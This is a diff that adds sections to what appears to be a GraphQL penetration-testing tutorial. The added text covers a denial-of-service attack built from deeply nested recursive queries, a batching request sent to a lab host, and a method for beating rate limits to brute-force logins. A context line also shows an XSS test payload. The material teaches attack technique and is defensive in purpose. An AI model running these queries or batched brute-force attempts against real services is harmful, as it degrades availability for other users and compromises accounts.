@@ -442,3 +442,144 @@ XSS vulns can also occur if invalid arguments are reflected in error messages. E
 
 However, if you attempt to trigger the URL from the corresponding GET parameter by accessing the URL `/post?id=<script>alert(1)</script>`, you can observe that the page simply breaks, and the XSS payload is not triggered.
 
+### DoS & Batching
+
+#### DoS
+
+To execute a DoS attack, you must identify a way to construct a query that results in a large response. Look at the visualization of the introspection results. You can identify a loop between `UserObject` and `PostObject` via the `author` and `post` fields:
+
+![graphql 17](../../../../images/graphql17.png)
+
+You can abuse this loop by constructing a query that queries the author of all posts. For each author, you then query the author of all posts again. If you repeat this many times, the result grows exponentially larger, potentially resulting in a DoS scenario.
+
+Since the `posts` object is a connection, you need to specify the edges and node fields to obtain a reference to the corresponding `Post` object. As an example, query the author of all posts. From there, you will query all posts by each author and then author's username for each of these posts:
+
+```graphql
+{
+  posts {
+    author {
+      posts {
+        edges {
+          node {
+            author {
+              username
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+This is an infinite loop you can repeat as many times as you want. If you take a look at the result of this query, it is already quite large because the response grows exponentially larger with each iteration of the loop you query:
+
+![graphql 18](../../../../images/graphql18.png)
+
+Making your initial query larger will significantly slow down the server, potentially causing availability issues for other users. For instance, the following query crashes the GraphiQL instance:
+
+```graphql
+{
+  posts {
+    author {
+      posts {
+        edges {
+          node {
+            author {
+              posts {
+                edges {
+                  node {
+                    author {
+                      posts {
+                        edges {
+                          node {
+                            author {
+                              posts {
+                                edges {
+                                  node {
+                                    author {
+                                      posts {
+                                        edges {
+                                          node {
+                                            author {
+                                              posts {
+                                                edges {
+                                                  node {
+                                                    author {
+                                                      posts {
+                                                        edges {
+                                                          node {
+                                                            author {
+                                                              posts {
+                                                                edges {
+                                                                  node {
+                                                                    author {
+                                                                      username
+                                                                    }
+                                                                  }
+                                                                }
+                                                              }
+                                                            }
+                                                          }
+                                                        }
+                                                      }
+                                                    }
+                                                  }
+                                                }
+                                              }
+                                            }
+                                          }
+                                        }
+                                      }
+                                    }
+                                  }
+                                }
+                              }
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+```
+
+![graphql 19](../../../../images/graphql19.png)
+
+#### Batching Attacks
+
+Batching in GraphQL refers to executing multiple queries with a single request. You can do so by directly supplying multiple queries in a JSON list in the HTTP request. For instance, you can query the ID of the user `admin` and the title of the first post in a single request:
+
+```http
+POST /graphql HTTP/1.1
+Host: 172.17.0.2
+Content-Length: 86
+Content-Type: application/json
+
+[
+	{
+		"query":"{user(username: \"admin\") {uuid}}"
+	},
+	{
+		"query":"{post(id: 1) {title}}"
+	}
+]
+```
+
+The response contains the requested information in the same structure you provided the query in:
+
+![graphql 20](../../../../images/graphql20.png)
+
+Batching is not a security vulnerability but an intended feature that can be enabled or disabled. However, batching can lead to security issues if GraphQL queries are used for sensitive processes such as user login. Since batching enables an attacker to provide multiple GraphQL queries in a single request, it can potentially be used to conduct brute-force attacks with significantly fewer HTTP requests. This could lead to bypasses of security measures in place to prevent brute-force attacks, such as rate limits.
+
+For instance, assume a web app uses GraphQL queries for user login. The GraphQL endpoint is protected by a rate limit, allowing only five requests per second. An attacker can brute-force user accounts at a rate of only five passwords per second. However, using GraphQL batching, an attacker can put multiple login queries into a single HTTP request. Assuming the attacker constructs an HTTP request containing 1000 different GraphQL login queries, the attacker can now brute-force user accounts with up to 5000 passwords per second, rendering the rate limit ineffective. Thus, GraphQL batching can enable powerful brute-force attacks.
+
